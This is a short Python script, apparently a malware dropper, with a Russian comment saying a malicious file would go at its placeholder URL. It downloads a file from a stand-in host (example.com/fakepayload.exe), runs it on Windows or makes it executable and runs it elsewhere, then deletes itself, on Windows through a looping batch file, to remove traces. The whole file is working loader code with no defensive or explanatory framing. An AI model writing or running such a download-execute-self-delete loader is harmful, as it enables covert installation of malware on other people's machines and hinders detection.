import os
import urllib.request
import subprocess
import platform
import shutil
import sys
import time

def is_windows():
    return platform.system().lower() == 'windows'

def download_and_execute(url, filename):
    try:
        urllib.request.urlretrieve(url, filename)
        if is_windows():
            subprocess.Popen(filename, shell=True)
        else:
            subprocess.call(["chmod", "+x", filename])
            subprocess.call(["./" + filename])
    except Exception as e:
        print("Error:", e)

def self_delete():
    if is_windows():
        bat_path = os.path.join(os.getenv("TEMP"), "delme.bat")
        with open(bat_path, "w") as bat_file:
            bat_file.write(f"""@echo off
        :loop
        del "{sys.argv[0]}" >nul 2>&1
        if exist "{sys.argv[0]}" goto loop
        del "%~f0"
        """)
        subprocess.Popen([bat_path], shell=True)
    else:
        os.remove(sys.argv[0])

if __name__ == "__main__":
    url = "http://example.com/fakepayload.exe"  # Здесь был бы вредоносный файл
    filename = "payload.exe"
    download_and_execute(url, filename)
    time.sleep(2)
    self_delete()